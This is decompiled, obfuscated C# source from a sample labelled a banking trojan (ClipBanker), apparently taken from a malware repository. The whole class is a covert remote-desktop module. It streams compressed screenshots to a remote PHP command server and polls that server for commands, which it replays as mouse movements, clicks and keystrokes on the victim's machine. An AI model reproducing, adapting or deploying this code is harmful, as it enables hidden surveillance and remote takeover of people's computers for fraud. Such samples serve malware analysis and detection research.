// Decompiled with JetBrains decompiler
// Type: a44.v75
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u00312k;
using \u0031xm;
using \u0032K4;
using \u0035J5;
using \u00386V;
using crD;
using fih;
using H16;
using l6z;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using xV4;

namespace a44
{
  internal static class v75
  {
    private static Thread \u0033e9;
    private static Yo1 I77;
    private static bool \u00355L;

    public static void \u003641(
      [In] string obj0,
      [In] int obj1,
      [In] bool obj2,
      [In] bool obj3,
      [In] string obj4,
      [In] string obj5,
      [In] string obj6,
      [In] string obj7)
    {
      v75.\u0036K7 obj = new v75.\u0036K7();
      obj.\u0032fi = obj1;
      obj.hs5 = obj4;
      obj.\u0033i3 = obj5;
      obj.Cn4 = obj6;
      obj.\u0036BJ = obj7;
      if (v75.\u0033e9 != null)
        return;
      v75.I77 = new Yo1();
      v75.I77.\u0038LZ(obj0);
      g79.\u0037l4("rdscreensize", new Dictionary<string, int>()
      {
        ["w"] = v75.I77.KD5.Width,
        ["h"] = v75.I77.KD5.Height
      }.LE3(), obj.hs5, obj.\u0033i3, obj.Cn4, obj.\u0036BJ);
      v75.\u0033e9 = new Thread(new ThreadStart(obj.\u003667));
      v75.\u0033e9.Start();
      if (obj2 | obj3)
        new Thread(new ThreadStart(obj.f84)).Start();
    }

    public static void ng1()
    {
      if (v75.\u0033e9 == null)
        return;
      v75.\u00355L = true;
      while (v75.\u00355L)
        Thread.Sleep(500);
      v75.\u0033e9 = (Thread) null;
      v75.I77.\u0023Nn();
      v75.I77 = (Yo1) null;
      GC.Collect();
    }

    private sealed class \u0036K7
    {
      public int \u0032fi;
      public string hs5;
      public string \u0033i3;
      public string Cn4;
      public string \u0036BJ;

      internal void \u003667()
      {
        while (!v75.\u00355L)
        {
          try
          {
            g79.Mr3(Nc4.BLg(Nc4.\u003492((Image) v75.I77.t7F(true), v75.I77.KD5.Width, v75.I77.KD5.Height, 100 - this.\u0032fi)), "rdscreen", this.hs5, this.\u0033i3, this.Cn4, this.\u0036BJ);
          }
          catch
          {
            GC.Collect();
          }
          Thread.Sleep(80);
        }
        v75.\u00355L = false;
      }

      internal void f84()
      {
        while (!v75.\u00355L)
        {
          try
          {
            Dictionary<string, string>[] dictionaryArray1 = new Dictionary<string, string>[1];
            Dictionary<string, string> dictionary1 = new Dictionary<string, string>()
            {
              [aw8.\u0038HV(g79.\u0032hf + "name")] = Ej4.R6b,
              [aw8.\u0038HV(g79.\u0032hf + "extension")] = aw8.\u00311f("rdbuffer" + Ej4.R6b),
              [aw8.\u0038HV(g79.\u0032hf + "data")] = ""
            };
            dictionaryArray1[0] = dictionary1;
            Dictionary<string, string>[] dictionaryArray2 = new Dictionary<string, string>[1];
            Dictionary<string, string> dictionary2 = new Dictionary<string, string>()
            {
              [aw8.\u0038HV(g79.\u0032hf + "name")] = Ej4.R6b,
              [aw8.\u0038HV(g79.\u0032hf + "extension")] = aw8.\u00311f("rdbuffer" + Ej4.R6b)
            };
            dictionaryArray2[0] = dictionary2;
            string str1 = aw8.P38(aw8.P38(xY7.\u0037bI(\u00382l.rjO(this.hs5 + this.Cn4 + ".php?" + g79.JrF + "&" + aw8.\u0038HV(g79.\u0032hf + "token") + "=" + Uri.EscapeDataString(xY7.\u0037bI(aw8.tt4(this.\u0033i3))) + "&" + aw8.\u0038HV(g79.\u0032hf + "token_uid") + "=" + Uri.EscapeDataString(xY7.\u0037bI(aw8.tt4(aw8.\u00311f(Ej4.R6b)))) + "&" + aw8.\u0038HV(g79.\u0032hf + "getdata") + "=" + Uri.EscapeDataString(xY7.\u0037bI(aw8.tt4(dictionaryArray2.LE3()))) + "&" + aw8.\u0038HV(g79.\u0032hf + "setdata") + "=" + Uri.EscapeDataString(xY7.\u0037bI(aw8.tt4(dictionaryArray1.LE3())))))).dtU<Dictionary<string, Dictionary<string, string>>>()[aw8.\u0038HV(g79.\u0032hf + Ej4.R6b)][aw8.\u0038HV(g79.\u0032hf + aw8.\u00311f("rdbuffer" + Ej4.R6b))]);
            string[] separator = new string[1]{ "|" };
            foreach (string str2 in str1.Split(separator, StringSplitOptions.None))
            {
              if (str2.Length >= 1)
              {
                if (str2.Contains("#"))
                {
                  string[] strArray = str2.Split(new string[1]
                  {
                    "#"
                  }, StringSplitOptions.None);
                  string str3 = strArray[0];
                  if (!(str3 == "M"))
                  {
                    if (!(str3 == "RD"))
                    {
                      if (!(str3 == "RU"))
                      {
                        if (!(str3 == "LD"))
                        {
                          if (str3 == "LU")
                            \u0036b9.qP2(4U, Convert.ToInt32(strArray[1].Split(',')[0]) + v75.I77.KD5.X, Convert.ToInt32(strArray[1].Split(',')[1]) + v75.I77.KD5.Y, 0, UIntPtr.Zero);
                        }
                        else
                          \u0036b9.qP2(2U, Convert.ToInt32(strArray[1].Split(',')[0]) + v75.I77.KD5.X, Convert.ToInt32(strArray[1].Split(',')[1]) + v75.I77.KD5.Y, 0, UIntPtr.Zero);
                      }
                      else
                        \u0036b9.qP2(16U, Convert.ToInt32(strArray[1].Split(',')[0]) + v75.I77.KD5.X, Convert.ToInt32(strArray[1].Split(',')[1]) + v75.I77.KD5.Y, 0, UIntPtr.Zero);
                    }
                    else
                      \u0036b9.qP2(8U, Convert.ToInt32(strArray[1].Split(',')[0]) + v75.I77.KD5.X, Convert.ToInt32(strArray[1].Split(',')[1]) + v75.I77.KD5.Y, 0, UIntPtr.Zero);
                  }
                  else
                    \u0036b9.G8l(Convert.ToInt32(strArray[1].Split(',')[0]) + v75.I77.KD5.X, Convert.ToInt32(strArray[1].Split(',')[1]) + v75.I77.KD5.Y);
                }
                else
                {
                  try
                  {
                    bool flag = true;
                    byte num1;
                    if (str2.Contains("^"))
                    {
                      flag = false;
                      num1 = Convert.ToByte(str2.Replace("^", ""));
                    }
                    else
                      num1 = Convert.ToByte(str2);
                    \u0036b9.Kp6.m1C[] m1CArray = new \u0036b9.Kp6.m1C[1]
                    {
                      new \u0036b9.Kp6.m1C()
                      {
                        Y48 = 1U,
                        \u003334 = new \u0036b9.Kp6.\u00332L()
                        {
                          LFd = new \u0036b9.Kp6.\u00373s()
                          {
                            ZQa = (ushort) num1,
                            \u003743 = (ushort) 0,
                            \u0037Q6 = flag ? 0U : 2U,
                            z3S = \u0036b9.\u0039R7()
                          }
                        }
                      }
                    };
                    int num2 = (int) \u0036b9.Kp6.\u0035nr((uint) m1CArray.Length, m1CArray, Marshal.SizeOf(typeof (\u0036b9.Kp6.m1C)));
                  }
                  catch
                  {
                  }
                }
                Thread.Sleep(1);
              }
            }
          }
          catch
          {
          }
          Thread.Sleep(100);
        }
      }
    }
  }
}
